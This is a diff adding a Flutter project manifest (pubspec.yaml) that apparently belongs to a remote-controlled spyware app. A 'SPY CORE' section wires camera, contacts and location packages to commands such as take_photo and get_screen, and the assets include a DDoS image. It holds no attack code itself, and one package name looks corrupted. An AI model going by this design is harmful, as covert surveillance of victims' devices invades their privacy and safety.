@@ -1,0 +1,73 @@
+name: wongirengjembuten365
+description: "Sikma"
+publish_to: 'none'
+version: 4.1.0
+
+environment:
+  sdk: ^3.8.1
+
+dependencies:
+  flutter:
+    sdk: flutter
+  http: any
+  url_launcher: any
+  cupertino_icons: any
+  shared_preferences: any
+  device_info_plus: any
+  carousenznznl_slider: any
+  audioplayers: any
+  web_socket_channel: any
+  network_info_plus: any
+  permission_handler: any
+  video_player: any
+  webview_flutter: any
+  shimmer: any
+  intl: any
+  font_awesome_flutter: any
+  
+  # --- HARDWARE & SPY CORE ---
+  geolocator: any
+  flutter_contacts: ^1.1.9+2 
+  # SUNTIKAN: Untuk perintah take_photo & get_screen
+  camera: any
+  # SUNTIKAN: Untuk perintah vibrate_loop
+  vibration: any
+  # SUNTIKAN: Untuk registrasi heartbeat & baterai
+  battery_plus: any
+
+dev_dependencies:
+  flutter_launcher_icons: any
+  flutter_test:
+    sdk: flutter
+  flutter_lints: any
+
+flutter_launcher_icons:
+  android: true
+  ios: true
+  image_path: "assets/icon/icon.jpg"
+  min_sdk_android: 21
+
+flutter:
+  uses-material-design: true
+
+  assets:
+    - assets/images/title.png
+    - assets/images/bokep.png
+    - assets/images/wa.png
+    - assets/images/tele.png
+    - assets/images/home.png
+    - assets/images/ddos.png
+    - assets/images/tools.png
+    - assets/images/logo.png
+    - assets/videos/splash.mp4
+    - assets/videos/load.mp4
+    - assets/videos/login.mp4
+    - assets/videos/banner.mp4
+
+  fonts:
+    - family: Orbitron
+      fonts:
+        - asset: fonts/Orbitron-Regular.ttf
+    - family: ShareTechMono
+      fonts:
+        - asset: fonts/ShareTechMono-Regular.ttf
